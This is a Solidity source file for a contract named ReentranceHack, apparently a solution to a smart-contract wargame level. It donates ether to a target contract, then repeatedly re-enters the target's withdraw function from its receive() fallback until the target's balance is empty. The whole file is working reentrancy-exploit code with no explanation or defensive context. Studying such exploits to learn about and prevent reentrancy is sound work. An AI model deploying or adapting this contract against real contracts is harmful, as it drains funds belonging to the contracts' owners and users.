// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ReentranceInterface {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract ReentranceHack {
    address payable public contractAddress;

    function setReentraceAddress(address payable _address) external payable{
        contractAddress = _address;
        ReentranceInterface(contractAddress).donate{value: msg.value}(address(this));
    }

    function hack(uint _amount) external {
        ReentranceInterface(contractAddress).withdraw(_amount);
    }

    receive() external payable {
        if (address(contractAddress).balance != 0) {
            ReentranceInterface(contractAddress).withdraw(msg.value);
        }
    }
}
